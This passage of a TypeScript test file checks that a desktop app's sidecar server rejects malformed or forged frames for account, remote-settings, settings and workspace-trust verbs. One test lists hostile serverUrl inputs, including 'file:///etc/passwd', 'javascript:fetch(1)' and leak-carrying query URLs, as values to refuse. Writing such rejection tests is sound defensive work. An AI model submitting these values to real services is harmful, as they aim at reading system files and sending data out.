  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    accountFrame({
      type: 'account.oauthCancel',
      requestId: 'c1',
      accountId: 'a',
    } as never),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'account.result')).toBe(false)
})

test('boundary — account.switch carrying provider:"anthropic" crosses and routes to the Anthropic arm', async () => {
  const switched: string[] = []
  const accounts = makeAccountsDomain({
    executor: fakeExecutor({
      switchAnthropic: async id => {
        switched.push(id)
        return { ok: true, message: 'switched anthropic' }
      },
    }),
  })
  seedClaudeAccountPoolForTest({
    accounts: [
      {
        accountUuid: 'claude-1',
        emailAddress: 'a@b.test',
        accessToken: 'SECRET',
        refreshToken: 'SECRET',
        expiresAt: 9_999_999_999,
        scopes: ['user:inference'],
        subscriptionType: 'max',
        rateLimitTier: null,
        status: 'healthy',
      },
    ],
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    accountFrame({
      type: 'account.switch',
      requestId: 's1',
      accountId: 'claude-1',
      provider: 'anthropic',
    } as never),
  )
  await flush()

  expect(switched).toEqual(['claude-1'])
  const result = received.find(f => f.kind === 'account.result')
  expect(result && result.kind === 'account.result' && result.ok).toBe(true)
  resetClaudeAccountPoolForTest()
})

test('boundary — account.switch with an unknown provider is rejected fail-closed', () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    accountFrame({
      type: 'account.switch',
      requestId: 's1',
      accountId: 'a',
      provider: 'gemini',
    } as never),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'account.result')).toBe(false)
})

test('P4-15 — paste-code then alias completes the flow (success) and re-broadcasts the accounts snapshot', async () => {
  const received_codes: string[] = []
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: fakeOAuthRunner({ requireManualCode: true, onPasteReceived: c => received_codes.push(c) }),
  })
  const { domain: runControls } = fakeRunControlsDomain()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    accounts,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    runControls,
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, accountFrame({ type: 'account.login', requestId: 'r1' }))
  await flush()
  const beforeSnapshots = received.filter(f => f.kind === 'accounts.snapshot').length
  const beforeRunControls = received.filter(
    f => f.kind === 'run-controls.snapshot',
  ).length

  server.handleData(
    conn,
    accountFrame({ type: 'account.oauthPasteCode', requestId: 'r2', code: 'AUTH-CODE-XYZ' }),
  )
  await flush()
  expect(received_codes).toEqual(['AUTH-CODE-XYZ'])

  server.handleData(conn, accountFrame({ type: 'account.oauthAlias', requestId: 'r3', alias: 'work' }))
  await flush()

  const success = received.find(
    f => f.kind === 'oauth.login.progress' && f.progress.state === 'success',
  )
  expect(success?.kind).toBe('oauth.login.progress')
  // success drives an accounts re-broadcast (clears the first-run surface / banner).
  expect(received.filter(f => f.kind === 'accounts.snapshot').length).toBeGreaterThan(beforeSnapshots)
  expect(
    received.filter(f => f.kind === 'run-controls.snapshot').length,
  ).toBeGreaterThan(beforeRunControls)
})

test('P4-15 — rejects account.oauthAlias carrying an unexpected key (checkStrictKeys)', () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor(), oauthRunner: fakeOAuthRunner() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'account.oauthAlias',
        requestId: 'r',
        alias: 'work',
        updatedPermissions: [],
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-15 — rejects account.oauthPasteCode with a missing code (schema)', () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor(), oauthRunner: fakeOAuthRunner() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.oauthPasteCode', requestId: 'r' } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-13 — RemoteSettings verbs (D3 cut scope)
 * ------------------------------------------------------------------------- */

function fakeRemoteExecutor(
  over: Partial<RemoteSettingsCommandExecutor> = {},
): RemoteSettingsCommandExecutor {
  return {
    checkBridgePrerequisites: async () => null,
    directConnect: async (serverUrl, cwd) => ({ sessionId: `s-${cwd}`, wsUrl: `ws://${serverUrl}` }),
    ...over,
  }
}

test('P4-13 — attach emits a remoteSettings.snapshot', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'remoteSettings.snapshot')
  expect(snap?.kind).toBe('remoteSettings.snapshot')
})

test('P4-13 — a valid bridgeToggle produces an ok result and re-broadcasts the snapshot', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'remoteSettings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r1', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result?.kind).toBe('remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'remoteSettings.result' && result.requestId).toBe('r1')
  expect(received.filter(f => f.kind === 'remoteSettings.snapshot').length).toBeGreaterThan(before)
})

test('P4-13 — a rejected bridgeToggle prerequisite produces an ok:false result and no re-broadcast', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor({ checkBridgePrerequisites: async () => 'blocked by policy' }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'remoteSettings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r2', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(false)
  expect(received.filter(f => f.kind === 'remoteSettings.snapshot').length).toBe(before)
})

test('P4-13 — a valid directConnect never carries token material and echoes requestId', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.directConnect', requestId: 'r3', serverUrl: 'https://remote.example.test:8200' } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'remoteSettings.result' && result.requestId).toBe('r3')
  expect(JSON.stringify(result)).not.toContain('token')
})

/**
 * `serverUrl` is the one renderer-authored string this boundary turns into a
 * real outbound request from the privileged sidecar (POST `{cwd}` to
 * `${serverUrl}/sessions`), which is exactly the egress SECURITY-MINIMUM T3
 * relies on `connect-src 'self'` to deny. A length-only bound let a compromised
 * renderer beacon out with the session cwd attached, so the shape is now
 * validated AT the boundary. Accept and reject are asserted together: the
 * acceptance above must keep working, and each rejected form must never reach
 * the domain (no executor call, no result frame, just `bad_request`).
 */
test('T3 — directConnect accepts a plain http URL and hands it to the domain', async () => {
  const seen: string[] = []
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor({
      directConnect: async serverUrl => {
        seen.push(serverUrl)
        return { sessionId: 's', wsUrl: 'ws://remote.example.test:8200/ws' }
      },
    }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'remoteSettings.directConnect',
        requestId: 'ok-1',
        serverUrl: 'http://127.0.0.1:8200',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(seen).toEqual(['http://127.0.0.1:8200'])
  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(true)
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('T3 — directConnect rejects every non-plain-http serverUrl at the boundary', async () => {
  const rejected: Array<[string, string]> = [
    // Not a URL at all.
    ['not-a-url', 'bare token'],
    // A scheme `fetch` cannot use — the placeholder shape, which never worked.
    ['cc://host:8200', 'cc scheme'],
    // Local file / in-page script schemes.
    ['file:///etc/passwd', 'file scheme'],
    ['javascript:fetch(1)', 'javascript scheme'],
    // Credentials would ride the outbound request.
    ['https://user:secret@host.tld', 'embedded credentials'],
    // Free-form exfil capacity the engine could not use anyway: it appends
    // `/sessions` to this exact string.
    ['https://host.tld/?leak=abc', 'query string'],
    ['https://host.tld/#leak', 'fragment'],
    // No host.
    ['https://', 'empty host'],
  ]

  for (const [serverUrl, label] of rejected) {
    let called = false
    const remoteSettings = createSidecarRemoteSettingsDomain({
      appStateStore: makePermissionStore(),
      cwd: '/tmp/proj',
      commands: [],
      executor: fakeRemoteExecutor({
        directConnect: async () => {
          called = true
          return { sessionId: 's', wsUrl: 'ws://x' }
        },
      }),
    })
    const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
    const { socket, received } = makeSocket()
    const conn = server.addConnection(socket)

    server.handleData(
      conn,
      encodeFrame({
        protocolVersion: PROTOCOL_VERSION,
        sessionId: SESSION,
        message: {
          type: 'remoteSettings.directConnect',
          requestId: 'bad-1',
          serverUrl,
        } as unknown as ClientFrame['message'],
      }),
    )
    await flush()

    expect([label, called]).toEqual([label, false])
    expect([
      label,
      received.some(f => f.kind === 'error' && f.code === 'bad_request'),
    ]).toEqual([label, true])
    expect([
      label,
      received.some(f => f.kind === 'remoteSettings.result'),
    ]).toEqual([label, false])
  }
})

test('P4-13 — rejects a remoteSettings verb carrying an unexpected key (checkStrictKeys)', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'remoteSettings.bridgeToggle',
        requestId: 'r',
        enable: true,
        updatedPermissions: [],
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-13 — rejects directConnect with a missing serverUrl (schema)', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.directConnect', requestId: 'r' } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-13 — a remoteSettings verb with no remoteSettings domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-19 — the settings WRITE verb (the FIRST renderer→engine settings write).
 * These exercise the SIDECAR boundary (schema + EDITABLE_SETTINGS allowlist +
 * per-key value gate + dispatch + result frame + re-broadcast); the real
 * SettingsUpdater-under-lock disk round-trip is proven in settingsDomain.test.ts.
 * ------------------------------------------------------------------------- */

/** makeServer with only a (fake) settings domain wired. */
function makeSettingsServer(runVerb?: SidecarSettingsDomain['runVerb']): SidecarServer {
  return makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    fakeSettingsDomain(runVerb),
  )
}

test('P4-19 — a valid settings.setValue produces an ok result and re-broadcasts the snapshot', () => {
  let seen: SettingsVerbMessage | null = null
  const server = makeSettingsServer(verb => {
    seen = verb
    return { ok: true, message: `Updated ${verb.key}.`, changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'settings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w1',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )

  const result = received.find(f => f.kind === 'settings.result')
  expect(result && result.kind === 'settings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'settings.result' && result.requestId).toBe('w1')
  expect(result && result.kind === 'settings.result' && result.verb).toBe('settings.setValue')
  // The domain received exactly the validated verb.
  expect(seen).toMatchObject({ source: 'userSettings', key: 'includeCoAuthoredBy', value: false })
  // A fresh snapshot was re-broadcast after the write landed.
  expect(received.filter(f => f.kind === 'settings.snapshot').length).toBeGreaterThan(before)
})

test('P4-19 — a dynamic-enum (outputStyle) string value passes the boundary to the domain', () => {
  // outputStyle rides the SAME settings.setValue verb (no new verb): the boundary
  // accepts a bounded string; the closed membership check is the domain's job.
  let seen: SettingsVerbMessage | null = null
  const server = makeSettingsServer(verb => {
    seen = verb
    return { ok: true, message: `Updated ${verb.key}.`, changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'os1',
        source: 'userSettings',
        key: 'outputStyle',
        value: 'Explanatory',
      } as unknown as ClientFrame['message'],
    }),
  )
  const result = received.find(f => f.kind === 'settings.result')
  expect(result && result.kind === 'settings.result' && result.ok).toBe(true)
  expect(seen).toMatchObject({ key: 'outputStyle', value: 'Explanatory' })
})

test('P4-19 — rejects a settings verb carrying an unexpected key (checkStrictKeys)', () => {
  const server = makeSettingsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
        updatedPermissions: [],
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  // The forged frame never reached a result.
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
})

test('P4-19 — rejects a non-editable source (policy) at the schema boundary', () => {
  let called = false
  const server = makeSettingsServer(() => {
    called = true
    return { ok: true, message: 'Updated.', changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'policySettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  // Rejected before the domain — no disk touch attempted.
  expect(called).toBe(false)
})

test('P4-19 — rejects a mistyped value and a non-allowlisted key at the value gate', () => {
  const server = makeSettingsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // fastMode is boolean → a string value is rejected.
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w1',
        source: 'userSettings',
        key: 'fastMode',
        value: 'on',
      } as unknown as ClientFrame['message'],
    }),
  )
  // apiKey is NOT in the editable allowlist → rejected (never written).
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w2',
        source: 'userSettings',
        key: 'apiKey',
        value: 'sk-live-X',
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.filter(f => f.kind === 'error' && f.code === 'bad_request').length).toBe(2)
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
})

/**
 * P4-41 — the CLEAR request (`value: null`) at the boundary. The renderer's reset
 * button is only safe if the sidecar accepts a clear for EVERY control kind and
 * still rejects everything it rejected before.
 */
function sendSettingsFrame(
  server: SidecarServer,
  conn: ReturnType<SidecarServer['addConnection']>,
  message: Record<string, unknown>,
): void {
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: message as unknown as ClientFrame['message'],
    }),
  )
}

test('P4-41 — a clear (value: null) reaches the domain for every control kind', () => {
  const seen: SettingsVerbMessage[] = []
  const server = makeSettingsServer(verb => {
    seen.push(verb)
    return { ok: true, message: `Cleared ${verb.key}.`, changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // boolean · enum · int · dynamic-enum — one key each, all on the same verb.
  const keys = ['fastMode', 'reasoningDisplay', 'cleanupPeriodDays', 'outputStyle']
  for (const key of keys) {
    sendSettingsFrame(server, conn, {
      type: 'settings.setValue',
      requestId: `c-${key}`,
      source: 'userSettings',
      key,
      value: null,
    })
  }

  expect(seen.map(verb => verb.key)).toEqual(keys)
  expect(seen.every(verb => verb.value === null)).toBe(true)
  const results = received.filter(f => f.kind === 'settings.result')
  expect(results.length).toBe(keys.length)
  expect(results.every(f => f.kind === 'settings.result' && f.ok)).toBe(true)
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('P4-41 — a clear is still refused for a non-editable source and an unknown key', () => {
  let called = false
  const server = makeSettingsServer(() => {
    called = true
    return { ok: true, message: 'Cleared.', changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Policy is not an editable layer — a clear can no more name it than a write.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'c1',
    source: 'policySettings',
    key: 'fastMode',
    value: null,
  })
  // Off the EDITABLE_SETTINGS allowlist: the key gate runs before the null branch,
  // so "remove" is no way around the closed vocabulary.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'c2',
    source: 'userSettings',
    key: 'apiKey',
    value: null,
  })

  expect(
    received.filter(f => f.kind === 'error' && f.code === 'bad_request').length,
  ).toBe(2)
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
  expect(called).toBe(false)
})

test('P4-41 — admitting null widened nothing else: bad values are still rejected', () => {
  const server = makeSettingsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Undefined is not null: a value-less frame fails the schema, it is not read
  // as a clear.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'b1',
    source: 'userSettings',
    key: 'fastMode',
  })
  // An object is not a scalar and not null.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'b2',
    source: 'userSettings',
    key: 'fastMode',
    value: {},
  })
  // Still type-checked per key: boolean key, string value.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'b3',
    source: 'userSettings',
    key: 'fastMode',
    value: 'on',
  })
  // Still strict on keys: an extra field is rejected before the Zod parse.
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'b4',
    source: 'userSettings',
    key: 'fastMode',
    value: null,
    clear: true,
  })

  expect(
    received.filter(f => f.kind === 'error' && f.code === 'bad_request').length,
  ).toBe(4)
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
})

test('P4-56 — autoMemoryEnabled accepts a boolean write and a clear', () => {
  const seen: SettingsVerbMessage[] = []
  const server = makeSettingsServer(verb => {
    seen.push(verb)
    return { ok: true, message: `Updated ${verb.key}.`, changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'memory-on',
    source: 'projectSettings',
    key: 'autoMemoryEnabled',
    value: true,
  })
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'memory-clear',
    source: 'projectSettings',
    key: 'autoMemoryEnabled',
    value: null,
  })

  expect(seen).toEqual([
    {
      type: 'settings.setValue',
      requestId: 'memory-on',
      source: 'projectSettings',
      key: 'autoMemoryEnabled',
      value: true,
    },
    {
      type: 'settings.setValue',
      requestId: 'memory-clear',
      source: 'projectSettings',
      key: 'autoMemoryEnabled',
      value: null,
    },
  ])
  expect(
    received.filter(f => f.kind === 'settings.result' && f.ok).length,
  ).toBe(2)
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('P4-56 — autoMemoryEnabled rejects wrong type, source, and unknown key', () => {
  let called = false
  const server = makeSettingsServer(() => {
    called = true
    return { ok: true, message: 'Updated.', changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'memory-wrong-type',
    source: 'userSettings',
    key: 'autoMemoryEnabled',
    value: 'true',
  })
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'memory-wrong-source',
    source: 'policySettings',
    key: 'autoMemoryEnabled',
    value: true,
  })
  sendSettingsFrame(server, conn, {
    type: 'settings.setValue',
    requestId: 'memory-unknown-key',
    source: 'userSettings',
    key: 'autoMemoryEnabledUnknown',
    value: true,
  })

  expect(
    received.filter(f => f.kind === 'error' && f.code === 'bad_request').length,
  ).toBe(3)
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
  expect(called).toBe(false)
})

test('P4-19 — a settings verb with no settings domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * CC-3 — idle self-exit timer (deterministic unit companion to
 * idleTtl.probe.test.ts). Proves the arm/clear/re-arm state machine directly.
 * ------------------------------------------------------------------------- */

test('CC-3 — onIdle fires after the TTL when no connection ever attaches', async () => {
  let idleCount = 0
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    idleTtlMs: 40,
    onIdle: () => {
      idleCount++
    },
    log: () => {},
  })
  servers.push(server)
  // Constructed with zero connections → the timer is already counting down.
  await Bun.sleep(120)
  expect(idleCount).toBe(1)
})

test('CC-3 — an open connection cancels the idle timer; closing it re-arms the countdown', async () => {
  let idleCount = 0
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    idleTtlMs: 40,
    onIdle: () => {
      idleCount++
    },
    log: () => {},
  })
  servers.push(server)

  const { socket } = makeSocket()
  const conn = server.addConnection(socket)
  // A live connection must never idle-exit, no matter how long it stays quiet.
  await Bun.sleep(120)
  expect(idleCount).toBe(0)

  // Dropping the last connection re-arms the countdown (the crash-orphan path).
  server.removeConnection(conn)
  await Bun.sleep(120)
  expect(idleCount).toBe(1)
})

/* ------------------------------------------------------------------------- *
 * P4-14 — workspace-trust + diagnostics read-seams
 * ------------------------------------------------------------------------- */

function fakeWorkspaceTrust(
  snapshot: ReturnType<SidecarWorkspaceTrustDomain['getSnapshot']>,
  acceptTrust: () => WorkspaceTrustAcceptResult = () => ({
    ok: true,
    message: 'Workspace trusted.',
    changed: true,
  }),
): SidecarWorkspaceTrustDomain {
  return { getSnapshot: () => snapshot, acceptTrust }
}

function fakeDiagnostics(
  snapshot: ReturnType<SidecarDiagnosticsDomain['getSnapshot']>,
): SidecarDiagnosticsDomain {
  return { getSnapshot: () => snapshot }
}

test('P4-14 — attach emits a workspace-trust.snapshot carrying the domain read', () => {
  const workspaceTrust = fakeWorkspaceTrust({
    trusted: true,
    detectedRepo: 'acme/cat-code',
    trustRoot: '/repo',
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    workspaceTrust,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'workspace-trust.snapshot')
  expect(snap).toEqual({
    kind: 'workspace-trust.snapshot',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    // `trustRoot` crosses the wire verbatim — the renderer gate cannot name the
    // real trust scope (git root ≠ session cwd) unless the snapshot carries it.
    workspaceTrust: { trusted: true, detectedRepo: 'acme/cat-code', trustRoot: '/repo' },
  })
})

test('P4-14 — a null workspace-trust read degrades to no frame, never strands the connection', () => {
  const workspaceTrust = fakeWorkspaceTrust(null)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    workspaceTrust,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'workspace-trust.snapshot')).toBe(false)
  // The rest of the attach sequence still ran (ready always fires first).
  expect(received[0]?.kind).toBe('ready')
})

/* ------------------------------------------------------------------------- *
 * P4-15 — workspace-trust ACCEPT verb (the session-create trust gate) boundary
 * ------------------------------------------------------------------------- */

function makeWorkspaceTrustServer(
  snapshot: ReturnType<SidecarWorkspaceTrustDomain['getSnapshot']>,
  acceptTrust?: () => WorkspaceTrustAcceptResult,
): SidecarServer {
  return makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    fakeWorkspaceTrust(snapshot, acceptTrust),
  )
}

test('P4-15 — a valid workspace.trust accept produces an ok result and re-broadcasts the trust snapshot', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: 'acme/x', trustRoot: '/repo' },
    () => {
      called++
      return { ok: true, message: 'Workspace trusted.', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(
    f => f.kind === 'workspace-trust.snapshot',
  ).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
        requestId: 't1',
      } as unknown as ClientFrame['message'],
    }),
  )

  const result = received.find(f => f.kind === 'workspace.trust.result')
  expect(result && result.kind === 'workspace.trust.result' && result.ok).toBe(true)
  expect(
    result && result.kind === 'workspace.trust.result' && result.requestId,
  ).toBe('t1')
  expect(called).toBe(1)
  // A fresh trust snapshot (now trusted:true) was re-broadcast after the write.
  expect(
    received.filter(f => f.kind === 'workspace-trust.snapshot').length,
  ).toBeGreaterThan(before)
})

test('P4-15 — an already-trusted accept returns ok but does NOT re-broadcast (changed:false)', () => {
  const server = makeWorkspaceTrustServer(
